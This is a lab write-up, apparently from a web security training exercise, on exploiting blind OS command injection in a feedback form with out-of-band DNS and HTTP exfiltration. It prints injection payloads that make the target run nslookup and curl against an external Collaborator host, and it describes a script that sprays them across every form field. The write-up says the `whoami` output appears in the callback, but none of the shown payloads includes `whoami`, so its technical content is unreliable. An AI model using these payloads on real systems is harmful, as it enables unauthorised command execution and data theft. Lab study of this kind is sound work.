
## 1. Initial reconnaissance
The lab reused the same feedback function pattern:

- Feedback form at `/feedback` with `name`, `email`, `subject`, and `message`.
- Submission to `POST /feedback/submit` with a CSRF token.

The description clarified that:
- There is blind OS command injection in the feedback function.
- Commands are executed asynchronously.
- No accessible writable directory is available for output redirection.
- The objective is to exfiltrate the output of `whoami` via an external DNS query (or HTTP request).

This made it clear that I needed an **out-of-band exfiltration** strategy.

## 2. Testing methodology
Prepare an external listener:

- Either a Burp Collaborator session, or
- Your own DNS/HTTP server reachable at a domain or IP (e.g. `dns.public`, `http://public/`).

Then, to avoid missing the vulnerable parameter or mis-guessing the syntax, reuse the **Intruder-like Sniper script**:

- Target parameters: `name`, `email`, `subject`, `message`.
- Use payloads from the list

## 3. Payload construction
Consider two families of payloads:

### DNS-based
```bash
nslookup 0vwnmm7szva3vvmf58rw532locu3it6i.oastify.com
;nslookup 0vwnmm7szva3vvmf58rw532locu3it6i.oastify.com;
&nslookup 0vwnmm7szva3vvmf58rw532locu3it6i.oastify.com&
```

When executed, the system would resolve a hostname like:
```text
0vwnmm7szva3vvmf58rw532locu3it6i.oastify.com
```

The username (`peter-ID`) appears as the left-most label.

### HTTP-based
```bash
curl http://0vwnmm7szva3vvmf58rw532locu3it6i.oastify.com/
;curl http://0vwnmm7szva3vvmf58rw532locu3it6i.oastify.com/;
```

This causes a request such as:
```http
GET / HTTP/1.1
Host: 0vwnmm7szva3vvmf58rw532locu3it6i.oastify.com
```

In both cases, the exfiltrated data (`whoami` output) appears in the DNS query or HTTP path.

The script:
1. Retrieved a CSRF token from `/feedback`.
2. For each parameter and payload wrapper, injected the appropriate DNS or HTTP exfil payload.
3. Sent a POST request to `/feedback/submit`.

## 4. Completing the attack
After sending the batch of requests, check the external server:

- **For DNS**: In the Collaborator or DNS logs, see queries like:
  ```
  0vwnmm7szva3vvmf58rw532locu3it6i.oastify.com
  ```
- **For HTTP**: In HTTP access logs, see requests such as:
  ```
  GET / HTTP/1.1
  Host: 0vwnmm7szva3vvmf58rw532locu3it6i.oastify.com
  ```

## Pro tips
### Why DNS requests are not the best out-of-band method?

When your vulnerable server runs `nslookup yourid.oastify.net` it does not query your Collaborator server directly - DNS has many caching layers. It queries its configured DNS resolver, for example:

- corporate DNS
- internal caching resolver
- forwarders
- Google DNS
- ISP DNS
- systemd-resolved, dnsmasq, unbound, bind, etc.

Those resolvers then contact root → TLD → authoritative → Collaborator (oastify.net) only **if they have no cached entry**. So not every `nslookup` command could call real DNS request. In many cases server resolves the hostname from cache.

Unlike HTTP request that reaches Collaborator server **EVERY** time.

> HTTP out-of-band exploitation is therefore stable, reliable, and recommended.

### Demonstration example
Execute DNS Intruder attack (1) with 16 payloads - get 2 DNS requests instead of ~10
(lab4-pic1)[link]

Execute HTTP Intruder attack with 16 payloads - get all 16 HTTP requests
(lab4-pic2)[link]

Execute DNS Intruder attack again (2) - get 2 DNS requests instead of ~10

Execute DNS the attack again (3) - get 1 DNS request
(lab4-pic3)[link]

Execute DNS the attack again (4) - get 0 DNS requests